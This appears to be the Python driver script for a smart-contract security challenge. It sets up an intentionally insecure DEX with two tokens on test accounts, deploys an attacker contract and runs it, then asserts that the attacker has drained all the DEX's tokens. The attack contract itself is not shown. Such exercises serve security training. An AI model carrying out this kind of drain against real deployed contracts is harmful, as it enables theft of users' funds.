from ape import accounts, project
from .utils.helper import w3, MAX_UINT256

TOKEN_SUPPLY = w3.to_wei(10, "ether")
DEX_LIQUIDITY = w3.to_wei(9, "ether")
ATTACKER_INITIAL_BALANCE = w3.to_wei(1, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy tokens
    print("\n--- Deploying Secureum Token and ERC223 Tokens ---\n")
    isec_token = project.InSecureumToken.deploy(
        TOKEN_SUPPLY,
        sender=deployer,
    )
    set_token = project.SimpleERC223Token.deploy(
        TOKEN_SUPPLY,
        sender=deployer,
    )

    assert isec_token.totalSupply() == TOKEN_SUPPLY
    assert set_token.totalSupply() == TOKEN_SUPPLY

    # deploy DEX
    print("\n--- Deploying DEX ---\n")
    dex = project.InsecureDexLP.deploy(
        isec_token.address,
        set_token.address,
        sender=deployer,
    )

    # approve DEX for tokens
    isec_token.approve(dex.address, MAX_UINT256, sender=deployer)
    set_token.approve(dex.address, MAX_UINT256, sender=deployer)

    # add liquidity to dex
    print("\n--- Adding liquidity to the DEX ---\n")
    dex.addLiquidity(DEX_LIQUIDITY, DEX_LIQUIDITY, sender=deployer)

    assert isec_token.balanceOf(dex.address) == DEX_LIQUIDITY
    assert set_token.balanceOf(dex.address) == DEX_LIQUIDITY

    # transfer initial balances of tokens to attacker
    print("\n--- Transfering some tokens to Attacker ---\n")
    isec_token.transfer(
        attacker.address,
        ATTACKER_INITIAL_BALANCE,
        sender=deployer,
    )
    set_token.transfer(
        attacker.address,
        ATTACKER_INITIAL_BALANCE,
        sender=deployer,
    )

    assert isec_token.balanceOf(attacker.address) == ATTACKER_INITIAL_BALANCE
    assert set_token.balanceOf(attacker.address) == ATTACKER_INITIAL_BALANCE

    # define initial balances for attacker and dex
    attacker_initial_bal = (
        isec_token.balanceOf(attacker.address) + set_token.balanceOf(attacker.address)
    ) / 10**18
    dex_initial_bal = (
        isec_token.balanceOf(dex.address) + set_token.balanceOf(dex.address)
    ) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Dex: {dex_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.DEXAttacker.deploy(
        dex.address,
        sender=attacker,
    )
    isec_token.approve(
        attacker_contract.address,
        MAX_UINT256,
        sender=attacker,
    )
    set_token.approve(
        attacker_contract.address,
        MAX_UINT256,
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker stole all tokens from the dex ---\n")

    # define ending balances for attacker and dex
    attacker_ending_bal = (
        isec_token.balanceOf(attacker.address) + set_token.balanceOf(attacker.address)
    ) / 10**18
    dex_ending_bal = (
        isec_token.balanceOf(dex.address) + set_token.balanceOf(dex.address)
    ) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Attacker: {attacker_ending_bal}\n⇒ Dex: {dex_ending_bal}\n---\n"
    )

    assert isec_token.balanceOf(dex.address) == 0
    assert set_token.balanceOf(dex.address) == 0
    assert isec_token.balanceOf(attacker.address) == TOKEN_SUPPLY
    assert set_token.balanceOf(attacker.address) == TOKEN_SUPPLY

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
